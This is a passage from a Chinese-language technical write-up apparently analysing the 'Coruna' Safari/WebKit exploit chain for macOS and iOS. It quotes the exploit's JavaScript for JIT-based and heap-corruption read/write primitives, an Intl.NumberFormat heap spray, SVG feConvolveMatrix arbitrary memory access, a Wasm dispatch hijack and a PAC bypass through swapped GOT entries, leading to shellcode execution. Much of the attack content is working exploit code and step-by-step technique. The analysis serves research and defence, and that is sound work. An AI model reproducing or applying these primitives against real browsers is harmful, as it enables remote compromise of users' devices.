// 36 个这样的循环,填充 DFG 图:while (h < 1) { s.guard_p1 = 1; h++ }while (h < 1) { s.guard_p1 = 1; h++ }// ... 还有 34 个 ...let u = o.p1;        // JIT 推测:总是双精度数组if (t) u = e;        // 预热期间从未采用的分支c[0] = u[1];         // 读取"数组"的第二个元素l[0] = l[0] + 16;    // 将 butterfly 指针偏移 16 字节u[1] = c[0];         // 写回 - 但 butterfly 现已位移
```  
  
经过足够迭代后,JIT 消除了 o.p1  
 上的结构检查——它"知道"p1  
 总是双精度数组。当漏洞最终传递 i  
(其中 p1  
 是整数)时,JIT 通过损坏的指针读取,给出 **16 字节相对读写位移**  
。  
  
**构建 R/W 原语(pm.ws)**  
  
那 16 字节位移很脆弱——pm.ws()  
 将其转化为稳定的 addrof  
、read  
 和 write  
 原语:  
```
// addrof:泄露任何对象的堆地址m.ps = function(n) {    o.b1 = n;                    // 存储目标对象    pm.gRWArray1[2] = t;        // 设置位移目标    h(1, 1.1);                  // 触发位移读取    return L(e[0]);             // 恢复泄露的指针};// 在任意地址读取 64 位m.ys = function(addr) {    a[1] = l;    e[0] = K(addr);             // 将地址编码为浮点    e[1] = x;    return L(f());              // 位移读取返回值};// 在任意地址写入 64 位m.bs = function(addr, val) {    a[1] = l;    e[0] = K(addr);    e[1] = x;    e[2] = K(val);    w();                        // 位移写入};
```  
  
**升级到绝对 R/W(pm.Us)**  
  
位移原语仍相对于损坏的对象。pm.Us()  
 通过创建受控 Array  
、泄露其内部后备存储指针并劫持 Array.prototype.length  
 以在任何地方读写,升级到绝对寻址:  
```
m.ns = function(t) {          // 绝对 read32    m.bs(n + 8, t + 8);      // 将数组后备存储重定向到目标    let i = e();              // 通过 .length 属性读取    m.bs(n + 8, r);          // 恢复原始后备存储    return i >>> 0;};m.rs = function(t) {          // 绝对 read64    return m.ns(t) + (m.ns(t+4) & 0x7FFFFFFF) * 4294967296;};
```  
  
高字上的 & 0x7FFFFFFF  
 掩码是 **PAC 位剥离**  
——清除 ARM64e 添加到每个指针的指针认证位。没有这个掩码,泄露的地址会包含 PAC 签名,使其无法用作原始指针。  
  
经过验证和清理后,生成的 R/W 原语存储在 T.Dn.Pn  
——YGPUu7 写入的同一全局槽。**利用链的其余部分不关心哪条路径先到达那里。**  
#### 路径 3:OfflineAudioContext 堆损坏 + SVG R/W(iOS)  
  
**来源:**Fq2t1Q_dbfd6e84.js  
(约 29KB)- iOS 专用路径  
  
这是三条路径中最复杂的,在架构上与两种 macOS 方法截然不同。路径 1 和 2 直接利用 JSC 的类型系统或 JIT 编译器,而路径 3 完全通过 **DOM 对象的堆损坏**  
构建其 R/W 原语——完全不涉及 JIT 技巧。它链接两个独立的 WebKit 漏洞:  
1. 1. **OfflineAudioContext.decodeAudioData**  
 - 通过精心制作的音频缓冲区进行堆损坏  
  
1. 2. **SVG feConvolveMatrix.orderX.baseVal**  
 - 通过损坏的 SVG 滤镜属性进行任意 R/W  
  
整个模块是 async  
 的——反映了需要多次 decodeAudioData  
 往返以增量损坏内存。macOS 路径是同步单次利用。**这是一场针对堆的耐心、迭代战役。**  
  
**阶段 1:用 Intl.NumberFormat 进行堆喷射**  
  
漏洞首先在堆上喷射 **7,000 个 Intl.NumberFormat 对象**  
:  
```
for (let i = 0; i < 7000; i++)    target[offset + i] = new Intl.NumberFormat("en-US", {})
```  
  
每个 NumberFormat  
 通过 .format(1)  
、.format(2)  
、.format(3)  
 初始化其 ICU 内部结构。在真实喷射旁边,代码创建带有**无效区域设置**  
的 NumberFormat  
 对象——"dowocjfjq["  
——以执行不同的 ICU 代码路径并使堆布局多样化。在分配轮次之间,约 960 MB 的临时 ArrayBuffer  
 分配(240 × 4 MB)被创建并立即丢弃,以触发垃圾回收并创建堆间隙。  
  
**阶段 2:音频缓冲区损坏**  
  
漏洞使用基于块的容器格式构造自定义音频缓冲区,包含 6 种块类型(音频描述、cookie 数据、数据包表、音频数据、通道布局、标记)。两种缓冲区变体重要:  
- • **预热缓冲区**  
(类 C  
):标准通道数据,用于堆整理  
  
- • **漏洞缓冲区**  
(类 p  
):具有精心计算的条目大小的通道数据,导致音频解码器写入超出其分配区域  
  
损坏序列调用 decodeAudioData**20 次**  
,在漏洞缓冲区和故意畸形的缓冲区(触发解码器中的错误路径分配)之间交替。每轮后,它扫描全部 7,000 个 NumberFormat  
 对象:  
```
// 检查损坏:format(1.02) 应产生恰好 4 个字符let result = target[i].format(1.02);if (result.length !== 4) {    // 这个 NumberFormat 的内部缓冲区被音频解码器覆写    // 从损坏的字符串中提取泄露的指针:    let leaked = result.charCodeAt(17) | (result.charCodeAt(18) << 16) | ...}
```  
  
有效的 format(1.02)  
 返回 "1.02"  
——4 个字符。如果长度不同,对象的内部 ICU 字符串缓冲区已被音频解码器的堆溢出覆写。损坏的字符串包含可通过 charCodeAt()  
 读取的堆指针。这会以递增的堆偏移重试最多 12 轮。  
  
**阶段 3:SVG feConvolveMatrix R/W 原语**  
  
有了提供初始内存读取的损坏 NumberFormat  
,漏洞通过 SVG 滤镜元素构建**稳定的 R/W 通道**  
:  
```
et[0] = document.createElementNS("http://www.w3.org/2000/svg", "feConvolveMatrix")et[1] = document.createElementNS("http://www.w3.org/2000/svg", "feConvolveMatrix")et[2] = document.createElementNS("http://www.w3.org/2000/svg", "feConvolveMatrix")
```  
  
三个 feConvolveMatrix  
 元素,每个提取其 orderX  
 属性:  
- • ot = et[0].orderX  
 - 目标地址低 32 位  
  
- • st = et[1].orderX  
 - 目标地址高 32 位  
  
- • at = et[2].orderX  
 - 数据读写通道  
  
**关键洞察**  
:feConvolveMatrix.orderX.baseVal  
 是一个 SVGAnimatedInteger  
。当你写入 baseVal  
 时,WebKit 直接写入元素在原生内存中的后备存储。通过损坏元素的内部 m_value  
 指针(使用 NumberFormat 泄露),对 baseVal  
 的写入变成对**任意内存位置**  
的写入。  
  
类 z  
 将此包装为简洁的 API:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">方法</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">操作</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">Si(addr)</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">设置目标:将 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">addr &gt;&gt; 32</span></code><span leaf=""> 写入 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">st.baseVal</span></code><span leaf="">,</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">(addr - 28) &amp; 0xFFFFFFFF</span></code><span leaf=""> 写入 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">ot.baseVal</span></code></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">Ai(val)</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">写入:通过 DataView uint32 往返设置 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">at.baseVal</span></code></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">Ti()</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">读取:通过 DataView uint32 读回 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">at.baseVal</span></code></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">tA(obj)</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">获取 JSCell 地址:将对象写入后备存储,读取内部指针</span></section></td></tr></tbody></table>  
  
Si()  
 中减去 28 是偏移补偿——SVG 元素的内部结构将实际值放在漏洞控制的指针之后 28 字节处。  
  
**阶段 4:Dyld 缓存遍历**  
  
有了 R/W 建立后,漏洞需要找到运行时符号。在 macOS 上,其他路径使用预构建的 Mach-O 解析器。在 iOS 上,路径 3 内联遍历 **dyld 共享缓存**  
:  
1. 1. **查找 MH_MAGIC_64**  
:从泄露地址开始,对齐到 655,360 字节并向后扫描寻找 0xfeedfacf  
  
1. 2. **解析加载命令**  
:读取 LC_SEGMENT_64  
 条目以查找 __TEXT  
(用于 ASLR 滑动)和 __LINKEDIT  
(用于符号表基址)  
  
1. 3. **遍历压缩导出 trie**  
:与共享缓存相同的 LEB128+trie 结构,在 JavaScript 中解析以解析 _pthread_main_thread_np  
  
1. 4. **解码 ARM64 指令**  
:在解析的函数处读取 ADRP+LDR 对以提取 _main_thread  
 指针地址  
  
**阶段 5:栈扫描以建立桥接**  
  
最后的挑战:将损坏的 R/W 原语(通过 SVG 元素操作)连接到漏洞的 JavaScript 执行上下文。漏洞先前将四个 **NaN-boxed 魔术标记**  
放入一个 200 元素数组(tt  
)中:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">偏移</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">标记值</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">+0</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0xfffe000000055432</span></code></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">+8</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0xfffe000000066533</span></code></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">+24</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0xfffe000000022334</span></code></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">+32</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0xfffe000000099234</span></code></td></tr></tbody></table>  
  
使用来自 _pthread_main_thread_np  
 的线程列表,漏洞遍历运行循环观察者,找到具有足够大小(≥40,960 字节)的栈帧,并扫描全部四个标记。找到时,偏移 +16 给出 **tt 数组本身的地址**  
——将 SVG R/W 世界桥接到 JavaScript 堆。  
  
从那里:将 SVG 句柄写入数组槽,读回它们的 JSCell 地址,修补引用计数(+16384)和类型标志(+16384)以防止 GC 回收,并构造路径 1 和 2 产生的相同 Class P 内存原语。输出进入 T.Dn.Pn  
。  
  
**三条路径,一个目的地**  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">方面</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">NaN-Boxing(5.1)</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">JIT 优化(5.2)</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">Audio/SVG(5.3)</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">平台</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">macOS(主)</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">macOS(备用)</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">iOS</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">错误类别</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">类型混淆</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">结构检查消除</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">堆溢出 + DOM 损坏</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">R/W 原语</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Wasm 内存视图</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">数组 butterfly 位移</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">SVG feConvolveMatrix.orderX</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">同步/异步</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">同步</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">同步</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">异步(全程 await)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">重试机制</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">单次尝试</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Worker 重试</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">12 轮 × 40 decodeAudioData</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">自包含</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">否</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">是</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">是</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">复杂度</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">~10KB</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">~24KB</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">~29KB</span></section></td></tr></tbody></table>  
  
iOS 路径最复杂——它必须通过完全通过 DOM 对象损坏构建 R/W 来克服基于 JIT 的原语的缺失。异步设计、重试循环、用垃圾区域设置进行的堆整理、线程列表遍历、栈扫描——所有这些都反映了 iOS 上比 macOS 更困难的利用环境。  
### 后利用:从 R/W 到 Shellcode  
  
这是 Coruna 变得有趣的地方——也是 Google 和 iVerify 的报告沉默的地方。Google 将 WebKit RCE 后的链描述为使用"非公开利用技术"。iVerify 根本没有覆盖它。**JavaScript 源码揭示了这些技术究竟是什么。**  
  
后利用链有四个阶段,每个阶段都建立在前一个之上:  
```
任意 R/W 原语(T.Dn.Pn)    │    ▼Wasm call_indirect 调度劫持(class ct → T.Dn.Wn)    → 将 Wasm 沙箱转换为原生函数调用原语    │    ▼通过无签名 GOT 交换绕过 PAC(classes ta、ha、ia、ca)    → 苹果自己的框架验证攻击者提供的指针    │    ▼mach_vm_allocate RWX 页面(class oc/hc)    → 从 WebContent 沙箱内获得可执行内存    │    ▼通过 PACDB 滚动哈希伪造逃逸 JIT 笼(hc.kg())    → 任意 shellcode 通过内核验证    │    ▼ARM64 shellcode 执行 - 游戏结束
```  
#### 阶段 1:Wasm call_indirect 调度劫持  
  
**问题**  
:你有任意内存读写,但无法调用  
任何东西。内存损坏让你读写数据,但调用原生函数需要控制流——而在 ARM64e 上,每个间接分支都经过 PAC 验证。  
  
**Coruna 的解决方案**  
:在 JavaScript 中内联构建一个 306 字节的 WebAssembly 模块,编译它,然后劫持 JIT 笼的调度指针以将 Wasm 函数调用重定向到任意地址。  
  
类 ct  
(全局存储为 T.Dn.Wn  
)从带有 XOR 混淆字节的 Uint8Array  
 构造 Wasm 模块。前四个字节解码为 \0asm  
(Wasm 魔数)。该模块导出四个项目:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">导出</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">类型</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">用途</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">&#34;f&#34;</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">主入口 - 16 个 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">i32</span></code><span leaf=""> 参数(= 8 个寄存器对)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">&#34;o&#34;</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">内部 shim - 其编译地址是劫持目标</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">&#34;m&#34;</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">内存</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">用于捕获返回值的共享缓冲区</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">&#34;t&#34;</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">表</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">内部 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">call_indirect</span></code><span leaf=""> 调度表</span></section></td></tr></tbody></table>  
  
编译后,ct  
 定位导出 "o"  
 的 JIT 编译地址并读取 _jitCagePtr  
——控制 Wasm 调度器跳转到哪个 JIT 代码页的内部 WebKit/JSC 指针:  
```
this.hf = a.tA(this.if);           // 编译的 'o' 的原生地址this.Fh = { lf: s.sc(this.En.uc, 0x0n) };  // PAC 签名的 _jitCagePtr
```  
  
call(target, args)  
 方法随后执行交换:  
```
call(t, a) {    // 1. 读取当前 JIT 笼指针(保存以恢复)    const h = s.Ci(c);    // 2. 用攻击者的目标地址覆写 _jitCagePtr    i.call({ _h: this.Fh.lf, xh: S(t), x1: l });    try {        // 3. 调用 Wasm 导出 f(16 个 i32 参数)- 调度器跟随        //    交换的指针到攻击者的目标函数        s.zi(c, n);        this.sf(...this.rf);        // 4. 从 Wasm 内存读取返回值        return this.nf[0];    } finally {        // 5. 恢复原始 JIT 笼指针        s.zi(c, h);    }}
```  
  
16 个 i32  
 Wasm 参数映射到 8 个 BigInt64  
 值——匹配 ARM64 的 8 个通用参数寄存器(x0  
-x7  
)。**整个漏洞链中的每个后续原生函数调用都通过 ct.call() 流动。**  
#### 阶段 2:通过无签名 GOT 交换绕过 PAC  
  
这是 Google 描述为"非公开"的技术。**这也是整个链中最优雅的部分。**  
  
**问题**  
:在 ARM64e 上,每个间接分支指令都验证 PAC 签名。你不能只是覆写函数指针并跳转到它——CPU 会出错。经典的 ROP/JOP 在现代苹果芯片上已死。  
  
**Coruna 的解决方案**  
:不要伪造 PAC 签名。相反,临时交换苹果自己框架中的**无签名**  
 GOT(全局偏移表)条目,然后触发一条合法的 PAC 认证调用路径,该路径将这些 GOT 条目作为数据操作数读取。CPU 验证代码的控制流(所有 PAC 检查通过——这是真实签名的代码),但它操作的数据  
已被交换。  
  
这是一次**混淆代理攻击**  
——苹果自己的 PAC 认证代码成为代理,不知不觉地调度到攻击者控制的目标。  
  
**类层次结构**  
  
四个类协作实现这一点:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">类</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">角色</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">存储位置</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">ta</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">PAC 引擎核心 - gadget 发现、调度协调器</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">T.Dn.On</span></code></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">ha</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">认证调用原语 - 假 ObjC 对象构造</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">T.Dn.Nn</span></code></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">ia</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GOT 交换调度器 - 实际的交换-触发-恢复序列</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">内部</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">ca</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">Intl.Segmenter</span></code><section><span leaf=""> JIT 触发器 - 强制通过交换路径执行</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">内部</span></section></td></tr></tbody></table>  
  
**GOT 交换如何工作(类 ia)**  
  
类 ia  
 使用从 dyld 共享缓存解析的**七个锚点符号**  
——CoreGraphics  
、libxml2  
、ActionKit  
 和其他系统框架中的 GOT 条目。其中两个(Yl  
 和 Wl  
)是交换目标。call()  
 方法运行四阶段序列:  
  
**阶段 1**  
 - 在分配的内存中构建假调度结构:入口点结构、768 字节假 vtable、携带目标函数指针和 PAC 签名位的嵌套假对象。  
  
**阶段 2**  
 - 交换 GOT 条目:  
```
const saved_Yl = a.Ci(this.En.Yl);  // 保存原始 GOT[Yl]const saved_Wl = a.Ci(this.En.Wl);  // 保存原始 GOT[Wl]a.zi(this.En.Yl, this.En.$l);   // GOT[Yl] = _HTTPConnectionFinalizea.zi(this.En.Wl, this.En.Zl);   // GOT[Wl] = _dlfcn_globallookup
```  
  
**阶段 3**  
 - 通过 Intl.Segmenter  
 JIT(类 ca  
)触发。JIT 编译的代码读取交换的 GOT 条目,跟随假对象链,并调度到攻击者的目标——全部通过合法的 PAC 认证指令序列。  
  
**阶段 4**  
 - 恢复并返回:  
```
} finally {    a.zi(this.En.Yl, saved_Yl);  // 恢复原始 GOT[Yl]    a.zi(this.En.Wl, saved_Wl);  // 恢复原始 GOT[Wl]}return a.Ci(this.Dh + 0x10n);    // 从缓冲区读取结果
```  
  
**为什么这绕过了 PAC**  
  
